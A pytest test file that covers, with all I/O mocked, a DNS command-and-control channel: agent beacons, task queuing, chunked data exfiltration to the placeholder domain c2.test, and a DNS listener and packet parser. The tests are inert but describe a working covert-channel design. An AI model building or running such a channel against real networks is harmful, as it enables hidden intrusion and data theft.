"""Hermetic protocol coverage for the DNS channel without I/O or execution."""

from __future__ import annotations

import binascii
import json
import socket
import struct
import subprocess
from types import SimpleNamespace

import pytest

import core.c2.channels.dns as dns_module
from core.c2.channels.dns import DNSChannel

pytestmark = [pytest.mark.contract, pytest.mark.security]


def _query_packet(name: str, qtype: int = 1) -> bytes:
    header = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
    labels = b"".join(bytes((len(label),)) + label.encode("ascii") for label in name.split(".") if label)
    return header + labels + b"\x00" + struct.pack("!HH", qtype, 1)


def test_codec_constructor_and_label_splitting_round_trip() -> None:
    with pytest.raises(ValueError, match="Unsupported record type"):
        DNSChannel("c2.test", "MX")

    channel = DNSChannel("c2.test.", "TXT")
    payload = bytes(range(96))
    labels = channel.encode_data(payload)

    assert channel.domain == "c2.test"
    assert len(labels) > 1
    assert all(len(label) <= 63 for label in labels)
    assert channel.decode_data(labels) == payload
    assert channel.encode_data(b"") == []
    assert channel.decode_data([]) == b""
    with pytest.raises(binascii.Error):
        channel.decode_data(["invalid!"])


def test_send_beacon_txt_a_truncation_and_failure_are_fully_mocked(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    txt_queries = []
    a_queries = []
    monkeypatch.setattr(
        dns_module,
        "_dns_query_txt",
        lambda name: txt_queries.append(name) or [],
    )
    monkeypatch.setattr(
        dns_module,
        "_dns_query_a",
        lambda name: a_queries.append(name) or "127.0.0.1",
    )

    txt = DNSChannel("c2.test", "TXT")
    txt_name = txt.send_beacon("AGT-123", b"alive")
    assert txt_name == txt_queries[0]
    assert txt_name.endswith(".agt123.c2.test")

    a_channel = DNSChannel("c2.test", "A")
    a_name = a_channel.send_beacon("AGT-456", b"alive")
    assert a_name == a_queries[0]

    long_name = txt.send_beacon("AGT-LONG", b"x" * 300)
    assert long_name == txt_queries[-1]
    assert long_name.endswith(".agtlong.c2.test")

    def fail(_name: str):
        raise OSError("mocked resolver failure")

    monkeypatch.setattr(dns_module, "_dns_query_txt", fail)
    assert txt.send_beacon("AGT-FAIL", b"alive") is None


def test_task_queue_server_and_mocked_client_receive_paths(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    channel = DNSChannel("c2.test")
    channel.queue_task("agent", "task-1", "fixture command text")
    channel.queue_task("agent", "task-2", "second fixture text")

    monkeypatch.setattr(
        dns_module,
        "_dns_query_txt",
        lambda _name: (_ for _ in ()).throw(AssertionError("server queue must not query DNS")),
    )
    assert channel.receive_task("agent") == {
        "task_id": "task-1",
        "command": "fixture command text",
    }
    assert channel.receive_task("agent") == {
        "task_id": "task-2",
        "command": "second fixture text",
    }

    task = {"task_id": "remote", "command": "inert fixture"}
    encoded = dns_module._b32_encode_safe(json.dumps(task).encode())
    records = [encoded[:5], encoded[5:]]
    monkeypatch.setattr(dns_module, "_dns_query_txt", lambda _name: records)
    assert channel.receive_task("AGT-REMOTE") == task

    monkeypatch.setattr(dns_module, "_dns_query_txt", lambda _name: [])
    assert channel.receive_task("AGT-EMPTY") is None

    def fail(_name: str):
        raise socket.gaierror("mocked lookup failure")

    monkeypatch.setattr(dns_module, "_dns_query_txt", fail)
    assert channel.receive_task("AGT-FAIL") is None


def test_exfiltration_queries_sleep_completion_and_recursion_are_mocked(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    queries = []
    sleeps = []

    def query(name: str):
        queries.append(name)
        if name.startswith(("0001.", "done.")):
            raise OSError("mocked query failure")
        return "127.0.0.1"

    monkeypatch.setattr(dns_module, "_dns_query_a", query)
    monkeypatch.setattr(dns_module.time, "sleep", sleeps.append)
    channel = DNSChannel("c2.test")

    assert channel.exfiltrate(b"abcde", chunk_size=2) == 2
    assert len([name for name in queries if name.startswith("000")]) == 3
    assert len(sleeps) == 3
    assert all(0.1 <= delay < 0.2 for delay in sleeps)

    oversized = DNSChannel("d" * 240)
    recursive_calls = []
    oversized.exfiltrate = lambda data, chunk_size: recursive_calls.append((data, chunk_size)) or 17
    assert DNSChannel.exfiltrate(oversized, b"abc", chunk_size=3) == 17
    assert recursive_calls == [(b"abc", 1)]


def test_listener_thread_lifecycle_is_a_nonstarting_double(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    threads = []

    class Thread:
        def __init__(self, **kwargs) -> None:
            self.kwargs = kwargs
            self.started = False
            self.joins = []
            threads.append(self)

        def start(self) -> None:
            self.started = True

        def join(self, timeout=None) -> None:
            self.joins.append(timeout)

    monkeypatch.setattr(dns_module.threading, "Thread", Thread)
    channel = DNSChannel("c2.test")

    channel.start_listener(port=5300)
    assert threads[0].started is True
    assert threads[0].kwargs["target"] == channel._listener_loop
    assert threads[0].kwargs["args"] == (5300,)
    with pytest.raises(RuntimeError, match="already running"):
        channel.start_listener(port=5301)

    channel.stop_listener()
    assert threads[0].joins == [5]
    assert channel._listener_thread is None
    channel.stop_listener()


def test_exfil_reassembly_empty_incomplete_and_complete_paths() -> None:
    channel = DNSChannel("c2.test")
    assert channel.get_exfil_data("missing") is None

    channel._received_data["incomplete"] = {1: b"second"}
    assert channel.get_exfil_data("incomplete") is None

    channel._received_data["complete"] = {1: b"two", 0: b"one"}
    assert channel.get_exfil_data("complete") == b"onetwo"
    assert "complete" not in channel._received_data


def test_listener_bind_failure_uses_only_a_socket_double(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    class Socket:
        def setsockopt(self, *_args) -> None:
            pass

        def settimeout(self, _timeout: float) -> None:
            pass

        def bind(self, _address) -> None:
            raise OSError("mocked bind failure")

    monkeypatch.setattr(dns_module.socket, "socket", lambda *_args: Socket())
    channel = DNSChannel("c2.test")
    channel._listener_running = True

    channel._listener_loop(5300)

    assert channel._listener_running is False


def test_listener_loop_packet_filtering_and_send_use_only_socket_doubles(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    channel = DNSChannel("c2.test")

    class Socket:
        def __init__(self) -> None:
            self.actions = [
                b"short",
                b"P" * 12,
                b"O" * 12,
                b"N" * 12,
                b"R" * 12,
                RuntimeError("mocked receive failure"),
                "stop",
            ]
            self.bound = None
            self.sent = []
            self.closed = False

        def setsockopt(self, *_args) -> None:
            pass

        def settimeout(self, _timeout: float) -> None:
            pass

        def bind(self, address) -> None:
            self.bound = address

        def recvfrom(self, _size: int):
            action = self.actions.pop(0)
            if action == "stop":
                channel._listener_running = False
                raise socket.timeout
            if isinstance(action, Exception):
                raise action
            return action, ("192.0.2.10", 53000)

        def sendto(self, data: bytes, address) -> None:
            self.sent.append((data, address))

        def close(self) -> None:
            self.closed = True

    sock = Socket()

    def parse(data: bytes):
        marker = data[:1]
        if marker == b"P":
            raise ValueError("mocked parse failure")
        if marker == b"O":
            return "outside.example", 1
        if marker == b"N":
            return "none.c2.test", 1
        return "reply.c2.test", 1

    def handle(_labels, query_name, *_args):
        return None if query_name.startswith("none") else b"response"

    monkeypatch.setattr(dns_module.socket, "socket", lambda *_args: sock)
    monkeypatch.setattr(dns_module, "_parse_dns_query", parse)
    channel._handle_query = handle
    channel._listener_running = True

    channel._listener_loop(5300)

    assert sock.bound == ("0.0.0.0", 5300)
    assert sock.sent == [(b"response", ("192.0.2.10", 53000))]
    assert sock.closed is True


def test_query_handler_covers_exfil_task_beacon_and_default_protocol_paths(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        dns_module,
        "_build_dns_response",
        lambda *_args, **_kwargs: b"A-RESPONSE",
    )
    monkeypatch.setattr(
        dns_module,
        "_build_dns_txt_response",
        lambda *_args, **_kwargs: b"TXT-RESPONSE",
    )
    channel = DNSChannel("c2.test")
    raw = b"query"
    addr = ("192.0.2.20", 53000)

    assert channel._handle_query([], "c2.test", 1, raw, addr) == b"A-RESPONSE"

    encoded = dns_module._b32_encode_safe(b"chunk")
    labels = ["0000", "0001", encoded, "exfil"]
    assert channel._handle_query(labels, "x.c2.test", 1, raw, addr) == b"A-RESPONSE"
    assert channel._handle_query(labels, "x.c2.test", 1, raw, addr) == b"A-RESPONSE"
    assert channel._received_data[addr[0]] == {0: b"chunk"}
    assert (
        channel._handle_query(
            ["0001", "0002", "!", "exfil"],
            "x.c2.test",
            1,
            raw,
            addr,
        )
        == b"A-RESPONSE"
    )

    channel._pending_tasks["agent"] = [{"task_id": "task", "command": "inert fixture"}]
    assert (
        channel._handle_query(
            ["task", "agent"],
            "task.agent.c2.test",
            16,
            raw,
            addr,
        )
        == b"TXT-RESPONSE"
    )
    assert (
        channel._handle_query(
            ["task", "agent"],
            "task.agent.c2.test",
            16,
            raw,
            addr,
        )
        == b"A-RESPONSE"
    )

    beacon = dns_module._b32_encode_safe(b"alive")
    assert (
        channel._handle_query(
            [beacon, "agent"],
            "beacon.c2.test",
            1,
            raw,
            addr,
        )
        == b"A-RESPONSE"
    )
    assert (
        channel._handle_query(
            ["!", "agent"],
            "bad.c2.test",
            1,
            raw,
            addr,
        )
        == b"A-RESPONSE"
    )
    assert (
        channel._handle_query(
            ["single"],
            "single.c2.test",
            1,
            raw,
            addr,
        )
        == b"A-RESPONSE"
    )


def test_txt_and_a_resolvers_are_fully_mocked(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    calls = []

    def run(command, **kwargs):
        calls.append((command, kwargs))
        return SimpleNamespace(stdout='"first"\n\n"second"\n')

    monkeypatch.setattr(subprocess, "run", run)
    assert dns_module._dns_query_txt("fixture.c2.test") == ["first", "second"]
    assert calls[0] == (
        ["dig", "+short", "TXT", "fixture.c2.test"],
        {"capture_output": True, "text": True, "timeout": 10},
    )

    def timeout(*_args, **_kwargs):
        raise subprocess.TimeoutExpired("dig", 10)

    monkeypatch.setattr(subprocess, "run", timeout)
    assert dns_module._dns_query_txt("fixture.c2.test") == []

    monkeypatch.setattr(
        dns_module.socket,
        "getaddrinfo",
        lambda *_args: [(socket.AF_INET, 0, 0, "", ("203.0.113.5", 0))],
    )
    assert dns_module._dns_query_a("fixture.c2.test") == "203.0.113.5"
    monkeypatch.setattr(dns_module.socket, "getaddrinfo", lambda *_args: [])
    assert dns_module._dns_query_a("fixture.c2.test") is None

    def lookup_failure(*_args):
        raise socket.gaierror("mocked lookup failure")

    monkeypatch.setattr(dns_module.socket, "getaddrinfo", lookup_failure)
    assert dns_module._dns_query_a("fixture.c2.test") is None


def test_dns_packet_parser_accepts_valid_and_rejects_each_malformed_shape() -> None:
    packet = _query_packet("task.agent.c2.test", 16)
    assert dns_module._parse_dns_query(packet) == ("task.agent.c2.test", 16)

    with pytest.raises(ValueError, match="too short"):
        dns_module._parse_dns_query(b"short")
    with pytest.raises(ValueError, match="label exceeds"):
        dns_module._parse_dns_query(b"\x00" * 12 + b"\x05ab")
    with pytest.raises(ValueError, match="missing QTYPE"):
        dns_module._parse_dns_query(b"\x00" * 12)
    with pytest.raises(ValueError, match="missing QTYPE"):
        dns_module._parse_dns_query(b"\x00" * 13)


def test_dns_response_builders_cover_question_and_chunk_loops() -> None:
    query = _query_packet("agent.c2.test", 1)
    response = dns_module._build_dns_response(
        query,
        "agent.c2.test",
        1,
        ip="203.0.113.9",
    )
    assert response[:2] == b"\x12\x34"
    assert response.endswith(bytes((203, 0, 113, 9)))

    txt_response = dns_module._build_dns_txt_response(
        query,
        "agent.c2.test",
        "x" * 300,
    )
    assert txt_response[:2] == b"\x12\x34"
    assert b"x" * 255 in txt_response

    empty_txt = dns_module._build_dns_txt_response(
        query,
        "agent.c2.test",
        "",
    )
    assert empty_txt[:2] == b"\x12\x34"
